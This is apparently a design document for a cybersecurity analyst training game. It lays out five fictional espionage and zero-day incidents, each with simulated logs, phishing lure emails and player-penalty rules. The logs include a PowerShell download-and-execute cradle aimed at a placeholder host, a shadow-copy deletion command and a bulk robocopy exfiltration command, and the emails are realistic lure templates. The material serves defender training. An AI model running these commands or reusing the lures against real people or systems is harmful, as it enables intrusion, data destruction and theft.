# VERIFY.EXE — Incident Package Library
### Phase 4: Content Expansion | Weeks 3–4

---

## ━━━ WEEK 3: CORPORATE ESPIONAGE ━━━

---

### 📁 INCIDENT 01 — The Headhunter

---

#### A. TICKET RESOURCE

| Field | Value |
|---|---|
| **Ticket ID** | `ESPIONAGE-001` |
| **Title** | Suspected IP Exfiltration via Spear-Phish — R&D Personnel |
| **Severity** | `Critical` |
| **Category** | `Phishing` |
| **Required Tool** | `email` |
| **Required Log IDs** | `LOG-ESP-001A`, `LOG-ESP-001B` |

**Description:**
> HR flagged an anomalous message received by `{victim}` from a domain impersonating a recruiting firm. Shortly after the email was opened, `{host}` initiated an outbound HTTPS session to `{malicious_url}`, a domain registered 48 hours prior. Forensics suspects credential harvesting linked to a competitor-sponsored APT group.

**Analysis Steps:**
1. Inspect email headers on the recruiting message for SPF/DKIM/DMARC alignment failures and domain age.
2. Correlate the timestamp of email open event with the first outbound beacon from `{host}` to `{malicious_url}` in the SIEM.
3. Use Terminal to run a passive DNS scan on `{malicious_url}` and confirm registrar overlap with known threat actor infrastructure.

---

#### B. EVIDENCE LOGS

**`LOG-ESP-001A`**
```
Source:   Office365
Severity: 4
Message:  "MessageReceived | Recipient={victim} | Sender=careers@{malicious_url} |
           Subject='Confidential Offer — Senior Principal Engineer' |
           AttachmentName='NDA_Draft_2024.docm' | SPF=FAIL | DKIM=FAIL |
           UserAction=Opened | Timestamp=2024-03-11T08:42:17Z"
```

**`LOG-ESP-001B`**
```
Source:   Firewall
Severity: 5
Message:  "OUTBOUND_ALLOW | SRC={host} | DST={ip} | DST_DOMAIN={malicious_url} |
           Protocol=HTTPS/443 | BytesSent=512 | BytesRecv=82340 |
           GeoIP=CN | ThreatFeed=MATCH:APT41_C2_IOC |
           Timestamp=2024-03-11T08:43:02Z"
```

---

#### C. EMAIL RESOURCE

**Subject:** `Confidential Offer — Senior Principal Engineer | Exclusive Opportunity`

**Headers:**
| Header | Result |
|---|---|
| SPF | `FAIL` |
| DKIM | `FAIL` |
| DMARC | `FAIL` |

**Body:**
```
Dear {victim},

My name is Rachel Holt, and I'm a Senior Talent Partner at Nexbridge Executive Search.
We've been retained by a Fortune 100 client — who must remain anonymous at this stage —
to identify a candidate of your exact profile for a Principal Engineering role.

Compensation band: $340,000 – $410,000 base, plus equity.

I've attached a mutual NDA so we can speak freely. Please review and return at
your earliest convenience. Given client timelines, I do need a response by EOD Friday.

Warm regards,
Rachel Holt | Nexbridge Executive Search
careers@{malicious_url}
```

**Hidden Risk:** `missed_c2_macro_exec`
> *If the player quarantines the email without first scanning the `.docm` attachment via Terminal, the macro execution event in `LOG-ESP-001B` is never formally attributed, leaving a gap in the incident chain — flagged as "Incomplete Evidence" at case close.*

---
---

### 📁 INCIDENT 02 — Ghost in the Codebase

---

#### A. TICKET RESOURCE

| Field | Value |
|---|---|
| **Ticket ID** | `ESPIONAGE-002` |
| **Title** | Insider Threat — Privileged Access Abuse Prior to Voluntary Termination |
| **Severity** | `High` |
| **Category** | `Insider Threat` |
| **Required Tool** | `siem` |
| **Required Log IDs** | `LOG-ESP-002A`, `LOG-ESP-002B` |

**Description:**
> The DLP system triggered on a bulk export of source code repositories from `{host}`, operated by `{victim}`, who submitted resignation paperwork 72 hours prior. Access patterns show off-hours queries against the IP Registry and anomalous CloudTrail API calls originating from `{ip}`. The volume and specificity of data accessed points to deliberate pre-departure exfiltration.

**Analysis Steps:**
1. Pull SIEM timeline for `{victim}`'s account activity in the 72 hours following resignation submission — baseline vs. current access volume.
2. Identify CloudTrail `ListBuckets` and `GetObject` API calls tied to `{host}` targeting IP/source code repositories.
3. Correlate outbound data transfer volume against DLP policy thresholds to confirm exfiltration exceeded incidental access.

---

#### B. EVIDENCE LOGS

**`LOG-ESP-002A`**
```
Source:   CloudTrail
Severity: 4
Message:  "API_CALL | Actor={victim} | Action=GetObject | Resource=s3://corp-src-prod/* |
           ObjectCount=1,847 | SrcIP={ip} | UserAgent=aws-cli/2.13 |
           AuthMethod=ValidSession | Timestamp=2024-03-13T02:17:44Z |
           Note=Off-hours_access, bulk_enumeration_pattern"
```

**`LOG-ESP-002B`**
```
Source:   SysMon
Severity: 5
Message:  "PROCESS_CREATE | Host={host} | User={victim} |
           Image=C:\Windows\System32\cmd.exe |
           CommandLine='robocopy \\corp-nas\engineering\src D:\USB_TRANSFER /E /COPYALL' |
           ParentImage=explorer.exe | IntegrityLevel=High |
           Timestamp=2024-03-13T02:31:09Z"
```

---

#### C. EMAIL RESOURCE

**Subject:** `Re: Knowledge Transfer Plan — Please Confirm Checklist`

**Headers:**
| Header | Result |
|---|---|
| SPF | `PASS` |
| DKIM | `PASS` |
| DMARC | `PASS` |

> *Note: Headers PASS because this email originates from a legitimate internal account — the threat is behavioral, not phishing-based. The email is a social engineering decoy to justify access.*

**Body:**
```
Hi {victim},

Per our conversation with HR, I'm sending over the standard offboarding knowledge transfer
checklist. Could you compile the relevant documentation and repository references for
your successor? Please include any architecture diagrams, internal wikis, and config
templates you own.

IT has provisioned temporary elevated access to ensure a smooth handoff — this expires
at EOD Friday.

Let me know if you hit any snags.

Best,
Marcus Webb
People Operations | IT Transition Team
```

**Hidden Risk:** `missed_dlp_exfil_volume`
> *If the player flags this as a routine offboarding email without cross-referencing the SIEM CloudTrail logs, the exfiltration volume goes unquantified — the case closes as "Unauthorized Access" (misclassification) rather than "Data Theft," triggering a narrative penalty in Week 4's briefing.*

---
---

### 📁 INCIDENT 03 — The Trusted Contractor

---

#### A. TICKET RESOURCE

| Field | Value |
|---|---|
| **Ticket ID** | `ESPIONAGE-003` |
| **Title** | Lateral Movement via Compromised Third-Party VPN Credential |
| **Severity** | `High` |
| **Category** | `Unauthorized Access` |
| **Required Tool** | `terminal` |
| **Required Log IDs** | `LOG-ESP-003A`, `LOG-ESP-003B` |

**Description:**
> A VPN session authenticated under a contractor account associated with `{victim}` has been active for 19 hours — well beyond their contracted window of 09:00–17:00 local. Session traffic originates from `{ip}`, a Bulgarian exit node, and `{host}` has recorded lateral movement attempts against three internal subnets. The contractor's physical access badge shows them off-premises since 16:45.

**Analysis Steps:**
1. Use Terminal to run a geolocation and ASN lookup on `{ip}` — confirm mismatch with contractor's registered location.
2. Isolate `{host}` from the network to sever the active session and prevent further lateral traversal.
3. Search SIEM IDS logs for SMB enumeration and NTLM relay attempt signatures originating from the session.

---

#### B. EVIDENCE LOGS

**`LOG-ESP-003A`**
```
Source:   IDS
Severity: 4
Message:  "LATERAL_MOVEMENT_DETECTED | SrcHost={host} | Protocol=SMB/445 |
           Signature=ET.POLICY.SMB_Enum_Attempt | TargetSubnets=10.10.20.0/24,10.10.30.0/24 |
           SessionUser={victim} | SrcIP={ip} | EventCount=312 |
           Timestamp=2024-03-14T03:12:55Z"
```

**`LOG-ESP-003B`**
```
Source:   Firewall
Severity: 3
Message:  "VPN_SESSION_ACTIVE | User={victim} | SrcIP={ip} |
           GeoIP=BG | ASN=AS60781_LeaseWeb_BV | SessionDuration=19h04m |
           BytesSent=4.2GB | BytesRecv=980MB | PolicyViolation=AFTER_HOURS_ACCESS |
           Timestamp=2024-03-14T03:44:00Z"
```

---

#### C. EMAIL RESOURCE

**Subject:** `Action Required: VPN Token Expiry — Re-Authenticate to Continue Work`

**Headers:**
| Header | Result |
|---|---|
| SPF | `FAIL` |
| DKIM | `PASS` |
| DMARC | `FAIL` |

> *DKIM passes because the attacker compromised the contractor's actual email account to send this re-authentication lure to IT — an advanced detail rewarding players who check all three headers.*

**Body:**
```
Hi IT Support,

I'm getting a "Session Token Expired" error on my VPN client tonight. I'm working
late to hit the deliverable deadline for the Mercer integration and need this resolved ASAP.

I've already re-entered my credentials three times. Can you reset my session token or
extend my access window? I'm connecting from {malicious_url}/vpn-token-reset if you
need to push a fix remotely.

Thanks for the quick turnaround — deadline is in 4 hours.

{victim}
External Contractor | Mercer Systems Integration
```

**Hidden Risk:** `premature_isolation_no_scan`
> *If the player isolates `{host}` before running a terminal ASN lookup on `{ip}`, the geolocation evidence is never formally logged. The isolation is correct, but the case is flagged "Incomplete Chain of Custody" — a narrative note appears warning that defense counsel could challenge the evidence in a legal proceeding.*

---

---

## ━━━ WEEK 4: ZERO-DAY APOCALYPSE ━━━

---

### 📁 INCIDENT 04 — Patient Zero

---

#### A. TICKET RESOURCE

| Field | Value |
|---|---|
| **Ticket ID** | `ZERODAY-001` |
| **Title** | Unpatched RCE Exploit — Active In-Memory Payload, No Disk Artifact |
| **Severity** | `Critical` |
| **Category** | `Malware` |
| **Required Tool** | `terminal` |
| **Required Log IDs** | `LOG-ZD-001A`, `LOG-ZD-001B` |

**Description:**
> IDS has flagged a memory injection event on `{host}`, attributed to `{victim}`'s active session. The payload exhibits fileless characteristics — no binary dropped to disk — and has established a persistent C2 heartbeat to `{ip}` over DNS over HTTPS (DoH), evading standard signature detection. The exploit vector is consistent with CVE-2024-XXXX, a zero-day in the enterprise PDF renderer disclosed by CISA 11 hours ago.

**Analysis Steps:**
1. Use Terminal to dump the running process list on `{host}` — identify any unsigned process injected into a trusted parent (e.g., `svchost.exe`, `explorer.exe`).
2. Search SIEM for DNS query logs from `{host}` targeting `{malicious_url}` with abnormal TTL values (< 60s), indicating fast-flux C2.
3. Isolate `{host}` immediately after evidence collection to sever C2 without triggering the payload's kill switch.

---

#### B. EVIDENCE LOGS

**`LOG-ZD-001A`**
```
Source:   SysMon
Severity: 5
Message:  "PROCESS_INJECTION | Host={host} | TargetProcess=svchost.exe (PID:1284) |
           InjectedBy=AcroRd32.exe (PID:9043) | Technique=T1055.012_Process_Hollowing |
           MemoryRegion=0x7FFE0000 | Unsigned=TRUE | DiskArtifact=NONE |
           User={victim} | Timestamp=2024-03-18T11:03:27Z"
```

**`LOG-ZD-001B`**
```
Source:   Firewall
Severity: 5
Message:  "DNS_OVER_HTTPS_BEACON | SrcHost={host} | DstIP={ip} |
           Query={malicious_url} | QueryInterval=30s | TTL=45 |
           ThreatFeed=MATCH:CISA_AA24-081A | BytesPerBeacon=128 |
           Technique=T1071.004_DoH_C2 | Timestamp=2024-03-18T11:03:58Z"
```

---

#### C. EMAIL RESOURCE

**Subject:** `URGENT: Board Resolution — Q1 Financial Audit Package (Confidential)`

**Headers:**
| Header | Result |
|---|---|
| SPF | `PASS` |
| DKIM | `PASS` |
| DMARC | `PASS` |

> *All headers PASS — the sending domain is a pixel-perfect lookalike (`corp0rate-finance.com` vs `corporate-finance.com`) that passed DMARC due to a misconfigured policy set to `p=none`. Rewards players who manually inspect the `From:` domain string rather than trusting the header summary.*

**Body:**
```
{victim},

The external auditors require the full Q1 reconciliation package before close of
business today. CFO has approved distribution to audit-qualified staff only.

Please find the consolidated report attached (PDF). Due to document sensitivity,
you will be prompted to enable extended content rendering to view the encrypted
sections — this is required by our compliance framework.

Do not forward. Do not print. Destroy after review.

Group Finance | Internal Audit Liaison
{malicious_url}
```

**Hidden Risk:** `missed_process_injection_before_isolate`
> *If the player isolates `{host}` without first dumping the process list via Terminal, the injection artifact in PID:1284 is lost on reboot. The C2 is severed, but forensic evidence of the zero-day's exact execution chain is destroyed — triggering a "Partial Containment" rating and a Week 4 narrative event where the attacker reuses the same exploit against a second host because the IOC was never fully characterized.*

---
---

### 📁 INCIDENT 05 — Cascade

---

#### A. TICKET RESOURCE

| Field | Value |
|---|---|
| **Ticket ID** | `ZERODAY-002` |
| **Title** | Ransomware Pre-Encryption Stage — Staging & Shadow Copy Deletion Detected |
| **Severity** | `Critical` |
| **Category** | `Ransomware` |
| **Required Tool** | `siem` |
| **Required Log IDs** | `LOG-ZD-002A`, `LOG-ZD-002B` |

**Description:**
> SysMon has detected `vssadmin.exe delete shadows /all` execution on `{host}` under `{victim}`'s session — a canonical pre-encryption ransomware behavior. The payload arrived via a weaponized link in a vendor invoice email pointing to `{malicious_url}`, and the actor's C2 at `{ip}` has been beaconing for 6 hours. **Encryption has NOT yet begun** — the analyst has a narrow window to isolate and contain before file destruction.

**Analysis Steps:**
1. Search SIEM for the `vssadmin` execution event and all preceding PowerShell obfuscation events in the 6-hour window to establish the full kill chain.
2. Identify any additional hosts that have connected to `{ip}` in the same window — assess blast radius before isolating `{host}`.
3. Immediately escalate to Terminal for host isolation — every minute of delay risks triggering the encryption stage.

---

#### B. EVIDENCE LOGS

**`LOG-ZD-002A`**
```
Source:   SysMon
Severity: 5
Message:  "COMMAND_EXEC | Host={host} | User={victim} |
           Image=C:\Windows\System32\vssadmin.exe |
           CommandLine='vssadmin.exe delete shadows /all /quiet' |
           ParentImage=powershell.exe | EncodedArg=TRUE |
           DecodedArg='IEX(New-Object Net.WebClient).DownloadString(\"{malicious_url}/stg2\")' |
           Technique=T1490_Inhibit_System_Recovery | Timestamp=2024-03-21T07:58:03Z"
```

**`LOG-ZD-002B`**
```
Source:   IDS
Severity: 5
Message:  "C2_HEARTBEAT | SrcHost={host} | DstIP={ip} | DstDomain={malicious_url} |
           Protocol=HTTPS/443 | BeaconInterval=360s | JitterRatio=0.15 |
           Signature=ET.RANSOM.LockBit3_C2_Pattern | ActiveDuration=6h12m |
           ThreatFeed=MATCH:FBI_Flash_CU-000167-MW | Timestamp=2024-03-21T08:00:41Z"
```

---

#### C. EMAIL RESOURCE

**Subject:** `Invoice #INV-2024-00892 — Payment Due Overdue: Immediate Action Required`

**Headers:**
| Header | Result |
|---|---|
| SPF | `FAIL` |
| DKIM | `FAIL` |
| DMARC | `FAIL` |

**Body:**
```
Dear {victim},

Please find attached Invoice #INV-2024-00892 for services rendered in February.
This payment is now 14 days overdue and subject to our late fee policy.

To view the itemized breakdown and submit payment authorization, please access
the secure invoice portal here:

  ➜ {malicious_url}/invoice/INV-2024-00892.pdf

If payment has already been processed, please disregard this notice and forward
the remittance confirmation to accounts@{malicious_url}.

Failure to respond within 24 hours will result in escalation to our legal team.

Accounts Receivable
Vanterra Solutions Group
```

**Hidden Risk:** `no_blast_radius_check_before_isolate`
> *If the player isolates `{host}` immediately without first checking SIEM for other hosts beaconing to `{ip}`, two additional endpoints that are already in the staging phase are missed. This triggers the Week 4 finale event "Cascade" — a second ransomware wave deploys on the unidentified hosts 4 hours later, escalating the campaign's critical path and locking the player out of the "Clean Sweep" achievement.*

---

## Quick Reference Matrix

| ID | Theme | Category | Severity | Required Tool | Hidden Risk Consequence |
|---|---|---|---|---|---|
| `ESPIONAGE-001` | Corporate Espionage | Phishing | Critical | email | `missed_c2_macro_exec` |
| `ESPIONAGE-002` | Corporate Espionage | Insider Threat | High | siem | `missed_dlp_exfil_volume` |
| `ESPIONAGE-003` | Corporate Espionage | Unauthorized Access | High | terminal | `premature_isolation_no_scan` |
| `ZERODAY-001` | Zero-Day Apocalypse | Malware | Critical | terminal | `missed_process_injection_before_isolate` |
| `ZERODAY-002` | Zero-Day Apocalypse | Ransomware | Critical | siem | `no_blast_radius_check_before_isolate` |

---

**Narrative Design Notes:**

Each hidden risk consequence is designed to create a **cascading consequence system** rather than binary success/failure. `ESPIONAGE-002`'s misclassification feeds into the Week 4 briefing, and `ZERODAY-001`'s partial containment directly enables `ZERODAY-002` if the player fails it — making the final incident feel like a consequence of prior analyst negligence rather than a scripted event. This rewards methodical players who follow the full analysis step chain before acting.